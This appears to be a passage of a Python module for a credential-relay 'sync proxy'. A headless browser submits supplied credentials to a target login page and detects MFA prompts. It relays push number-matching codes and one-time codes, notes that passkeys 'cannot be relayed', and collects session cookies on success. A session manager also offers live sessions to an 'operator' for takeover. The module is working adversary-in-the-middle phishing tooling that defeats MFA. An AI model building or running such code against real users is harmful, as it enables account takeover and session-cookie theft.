                        'status': 'failed',
                        'error': 'Passkey or hardware-key authentication required — cannot be relayed',
                        'error_type': 'passkey_required',
                        'final_url': final_url,
                        'page_title': page_title,
                    }
            except Exception:
                pass

            # 3b. No MFA input found — check for push-approval / number-matching display
            try:
                body_text = await page.inner_text('body')
                body_lower = body_text.lower()
                # Specific push-approval phrases. "authenticator app" alone is too
                # generic — it appears on OTP pages too.
                push_keywords = [
                    'approve the sign-in', 'approve sign-in', 'tap to approve',
                    'confirm the number', 'select the number', 'select this number',
                    'match the number', 'enter the number shown', 'number matching',
                    'sign-in request we sent', 'approve the request',
                    'check your authenticator', 'open your authenticator',
                    # PingID / PingOne
                    'authenticating on', 'waiting for approval',
                    'approve the authentication', 'authentication in progress',
                ]
                if any(kw in body_lower for kw in push_keywords):
                    import re
                    # Look for a standalone number on its own line — number-match
                    # codes are usually rendered as a big standalone digit block.
                    # Prefer that over numbers embedded in sentences.
                    standalone = re.findall(
                        r'(?:^|\n)\s*(\d{1,3})\s*(?:\n|$)', body_text
                    )
                    fallback = re.findall(r'\b(\d{1,3})\b', body_text)
                    candidates = standalone or fallback
                    prompt_text = await self._get_mfa_prompt_text(page)
                    if candidates:
                        result = {
                            'status': 'needs_display',
                            'display_value': candidates[0],
                            'prompt_text': prompt_text,
                            'final_url': final_url,
                        }
                        shot = await self._take_result_screenshot(page)
                        if shot:
                            result['screenshot'] = shot
                        return result
                    # Push without a visible number (e.g. consumer Outlook):
                    # still needs polling, just no number to display.
                    result = {
                        'status': 'needs_display',
                        'display_value': '',
                        'prompt_text': prompt_text or 'Approve the sign-in request on your phone',
                        'final_url': final_url,
                    }
                    shot = await self._take_result_screenshot(page)
                    if shot:
                        result['screenshot'] = shot
                    return result
            except Exception:
                pass

            # 4. Check for success indicators
            if automation:
                success_indicators = await automation._detect_success_indicators(page)
            else:
                success_indicators = []

            url_changed = final_url != self.target_url
            has_success = len(success_indicators) > 0
            no_errors = not error_messages

            # 4a. Strong success: explicit success indicators (dashboard, welcome, etc.)
            if has_success and no_errors:
                cookies = []
                try:
                    cookies = await page.context.cookies()
                except Exception:
                    pass
                result = {
                    'status': 'success',
                    'cookies': cookies,
                    'final_url': final_url,
                    'page_title': page_title,
                    'success_indicators': success_indicators,
                }
                screenshot = await self._take_result_screenshot(page)
                if screenshot:
                    result['screenshot'] = screenshot
                return result

            # 4b. URL changed but NO success indicators — check for form inputs
            #     A page with visible form inputs after URL change is an intermediate
            #     step (e.g. password page after email), NOT a success.
            if url_changed and no_errors:
                # Brief wait for late-rendering content to settle
                try:
                    await page.wait_for_load_state('domcontentloaded', timeout=1000)
                except Exception:
                    pass
                await asyncio.sleep(0.3)

                has_form_inputs = False
                try:
                    visible_inputs = await page.query_selector_all('input:visible')
                    for inp in visible_inputs:
                        inp_type = (await inp.get_attribute('type') or 'text').lower()
                        if inp_type in ('text', 'password', 'email', 'number', 'tel'):
                            has_form_inputs = True
                            break
                except Exception:
                    pass

                if has_form_inputs:
                    # Page has inputs → intermediate step, NOT success
                    # Check for MFA keywords to provide a meaningful prompt
                    mfa_keywords = ['verification code', 'enter the code', 'enter code',
                                    'security code', 'two-factor', '2-step', 'authenticator',
                                    'one-time', 'otp', 'mfa']
                    try:
                        body_text = await page.inner_text('body')
                        body_lower = body_text.lower()
                        is_mfa_page = any(kw in body_lower for kw in mfa_keywords)
                    except Exception:
                        is_mfa_page = False

                    prompt_text = await self._get_mfa_prompt_text(page)
                    result = {
                        'status': 'needs_input',
                        'prompt_text': prompt_text if is_mfa_page else 'Additional input required',
                        'input_type': 'text',
                        'final_url': final_url,
                    }
                    shot = await self._take_result_screenshot(page)
                    if shot:
                        result['screenshot'] = shot
                    return result
                else:
                    # No form inputs — could be real success OR a button-only
                    # auth-progress page (verification picker, "approve sign-in",
                    # consent screen with buttons). Guard against false-positive
                    # success: if the page contains auth-flow keywords, treat
                    # it as failed-to-classify rather than success.
                    try:
                        body_text = await page.inner_text('body')
                        body_lower = body_text.lower()
                    except Exception:
                        body_lower = ''
                    auth_progress_keywords = [
                        'sign in', 'sign-in', 'verify', 'verification',
                        'send a code', 'send notification', 'send a sign-in',
                        'authenticator', 'authenticating', 'approve',
                        'two-factor', '2-step',
                        'one-time', 'otp', 'passkey', 'security key',
                        'allow access', 'permissions requested',
                    ]
                    if any(kw in body_lower for kw in auth_progress_keywords):
                        # Capture a screenshot of the stuck page for diagnosis
                        logger.warning(
                            f"Stuck on auth step at {final_url}. "
                            f"Page title: {page_title!r}. "
                            f"Body text (first 400 chars): {body_text[:400]!r}"
                        )
                        result = {
                            'status': 'failed',
                            'error': 'Stuck on an auth step the proxy could not advance through',
                            'error_type': 'auth_step_unhandled',
                            'final_url': final_url,
                            'page_title': page_title,
                        }
                        screenshot = await self._take_result_screenshot(page)
                        if screenshot:
                            result['screenshot'] = screenshot
                        return result
                    # Genuine success: no inputs, no auth keywords (dashboard, etc.)
                    cookies = []
                    try:
                        cookies = await page.context.cookies()
                    except Exception:
                        pass
                    result = {
                        'status': 'success',
                        'cookies': cookies,
                        'final_url': final_url,
                        'page_title': page_title,
                    }
                    screenshot = await self._take_result_screenshot(page)
                    if screenshot:
                        result['screenshot'] = screenshot
                    return result

            # 5. Same URL, no errors — check if we're still on the same page
            if not error_messages and not url_changed:
                try:
                    body_text = await page.inner_text('body')
                    if len(body_text.strip()) > 50:
                        forms = await page.query_selector_all('form:visible')
                        if forms:
                            prompt_text = await self._get_mfa_prompt_text(page)
                            result = {
                                'status': 'needs_input',
                                'prompt_text': prompt_text or 'Please enter the verification code',
                                'input_type': 'text',
                                'final_url': final_url,
                            }
                            shot = await self._take_result_screenshot(page)
                            if shot:
                                result['screenshot'] = shot
                            return result
                except Exception:
                    pass

            # 6. Final fallback: failed
            return {
                'status': 'failed',
                'error': 'Could not determine login result',
                'error_messages': error_messages,
                'final_url': final_url,
                'page_title': page_title,
            }

        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    async def _get_mfa_prompt_text(self, page) -> str:
        """Extract MFA prompt text from the page."""
        prompt_selectors = [
            'h1', 'h2', 'h3',
            'label',
            '[class*="prompt"]', '[class*="description"]',
            '[class*="subtitle"]', '[class*="instruction"]',
            'p',
        ]
        for selector in prompt_selectors:
            try:
                elements = await page.query_selector_all(selector)
                for el in elements[:3]:
                    text = await el.inner_text()
                    if text and len(text.strip()) > 5 and len(text.strip()) < 200:
                        text_lower = text.lower()
                        mfa_kw = ['code', 'verify', 'authenticat', 'two-factor',
                                   '2-step', 'confirm', 'approve', 'enter',
                                   'one-time', 'otp', 'security']
                        if any(kw in text_lower for kw in mfa_kw):
                            return text.strip()
            except Exception:
                continue
        return 'Enter verification code'

    @staticmethod
    def _build_credential_mapping(form_fields, credentials, ai_detector, html):
        """
        Map credentials to form field selectors.
        Reuses the same logic from credential_proxy_processor.py:209-272.
        """
        credential_mapping = {}

        # Map email/username
        email_field = form_fields.get('email') or form_fields.get('username')
        if email_field:
            if isinstance(email_field, str):
                email_selector = [email_field]
            elif isinstance(email_field, list):
                email_selector = email_field
            else:
                email_selector = []

            if email_selector:
                if 'email' in credentials:
                    credential_mapping['email'] = email_selector
                elif 'username' in credentials:
                    credential_mapping['username'] = email_selector

        # Map password
        password_field = form_fields.get('password')
        if password_field:
            if isinstance(password_field, str):
                password_selector = [password_field]
            elif isinstance(password_field, list):
                password_selector = password_field
            else:
                password_selector = []

            if password_selector and 'password' in credentials:
                credential_mapping['password'] = password_selector

        # Map other fields
        for cred_field_name in credentials.keys():
            if cred_field_name not in ('email', 'username', 'password'):
                field_value = form_fields.get(cred_field_name)
                if field_value:
                    if isinstance(field_value, str):
                        credential_mapping[cred_field_name] = [field_value]
                    elif isinstance(field_value, list):
                        credential_mapping[cred_field_name] = field_value

        # Validate required fields — fallback to heuristics
        has_email_or_username = 'email' in credential_mapping or 'username' in credential_mapping
        has_password = 'password' in credential_mapping

        if not has_email_or_username or not has_password:
            fallback_fields = ai_detector._fallback_detection(html)
            if not has_email_or_username:
                email_selectors = fallback_fields.get('email', [])
                if email_selectors:
                    if 'email' in credentials:
                        credential_mapping['email'] = email_selectors
                    elif 'username' in credentials:
                        credential_mapping['username'] = email_selectors
            if not has_password:
                password_selectors = fallback_fields.get('password', [])
                if password_selectors and 'password' in credentials:
                    credential_mapping['password'] = password_selectors

        return credential_mapping


class SyncProxyManager:
    """
    Global singleton managing active SyncProxySessions.
    Thread-safe via threading.Lock.
    """

    def __init__(self, session_timeout: int = 300):
        self._sessions: Dict[str, SyncProxySession] = {}
        self._lock = threading.Lock()
        self._session_timeout = session_timeout
        self._cleanup_thread: Optional[threading.Thread] = None
        self._running = False

    def start(self):
        """Start the background cleanup thread."""
        if self._running:
            return
        self._running = True
        self._cleanup_thread = threading.Thread(
            target=self._cleanup_loop, daemon=True
        )
        self._cleanup_thread.start()
        logger.info("SyncProxyManager started")

    def stop(self):
        """Stop the manager and clean up all sessions."""
        self._running = False
        if self._cleanup_thread:
            self._cleanup_thread.join(timeout=5)
        with self._lock:
            for sid, sess in list(self._sessions.items()):
                try:
                    sess.cleanup()
                except Exception:
                    pass
            self._sessions.clear()
        logger.info("SyncProxyManager stopped")

    def create_session(self, target_url: str, credentials: Dict[str, str],
                       config: Dict[str, Any] = None) -> SyncProxySession:
        """Create and register a new sync proxy session."""
        config = config or {}
        session = SyncProxySession(target_url, credentials, config)
        with self._lock:
            self._sessions[session.session_id] = session
        logger.info(f"Created sync proxy session {session.session_id}")
        return session

    def get_session(self, session_id: str) -> Optional[SyncProxySession]:
        """Get a session by ID."""
        with self._lock:
            return self._sessions.get(session_id)

    def remove_session(self, session_id: str):
        """Cleanup browser and remove session."""
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            try:
                session.cleanup()
            except Exception:
                pass
            logger.info(f"Removed sync proxy session {session_id}")

    def get_active_count(self) -> int:
        """Return number of active sessions."""
        with self._lock:
            return len(self._sessions)

    def get_sessions_summary(self) -> list:
        """Return summary of all active sessions."""
        with self._lock:
            return [
                {
                    'session_id': s.session_id,
                    'target_url': s.target_url,
                    'created_at': s.created_at,
                    'last_activity': s.last_activity,
                    'age_seconds': time.time() - s.created_at,
                    'state': s.state,
                }
                for s in self._sessions.values()
            ]

    def get_operator_sessions(self) -> list:
        """Return sessions available for operator interaction."""
        with self._lock:
            return [
                {
                    'session_id': s.session_id,
                    'target_url': s.target_url,
                    'created_at': s.created_at,
                    'last_activity': s.last_activity,
                    'age_seconds': time.time() - s.created_at,
                    'state': s.state,
                    'current_url': s.get_current_url(),
                    'page_title': s.get_page_title(),
                }
                for s in self._sessions.values()
                if s.state in ('operator_available', 'screencast')
            ]

    def _cleanup_loop(self):
        """Background loop: expire idle sessions."""
        while self._running:
            try:
                self._expire_idle_sessions()
            except Exception as e:
                logger.exception(f"Error in sync proxy cleanup loop: {e}")
            # Check every 30 seconds
            for _ in range(30):
                if not self._running:
                    break
                time.sleep(1)

    def _expire_idle_sessions(self):
        """Remove sessions that have been idle beyond the timeout.
        Sessions in 'screencast' state are protected — operator is active."""
        now = time.time()
        expired = []
        with self._lock:
            for sid, sess in self._sessions.items():
                if sess.state == 'screencast':
                    continue
                if now - sess.last_activity > self._session_timeout:
                    expired.append(sid)
        for sid in expired:
            logger.info(f"Expiring idle sync proxy session {sid}")
            self.remove_session(sid)


# Module-level singleton
_manager: Optional[SyncProxyManager] = None
_manager_lock = threading.Lock()


def get_sync_proxy_manager() -> Optional[SyncProxyManager]:
    """Get the global SyncProxyManager instance."""
    return _manager


def start_sync_proxy_manager(session_timeout: int = 300):
    """Start the global SyncProxyManager."""
    global _manager
    # Prevent duplicate starts during Flask debug reloads
    try:
        from werkzeug.serving import is_running_from_reloader
        if is_running_from_reloader():
            logger.debug("Skipping SyncProxyManager start in reloader child process")
            return
    except ImportError:
        pass

    with _manager_lock:
        if _manager is None:
            _manager = SyncProxyManager(session_timeout=session_timeout)
            _manager.start()


def stop_sync_proxy_manager():
    """Stop the global SyncProxyManager."""
    global _manager
    with _manager_lock:
        if _manager:
            _manager.stop()
            _manager = None
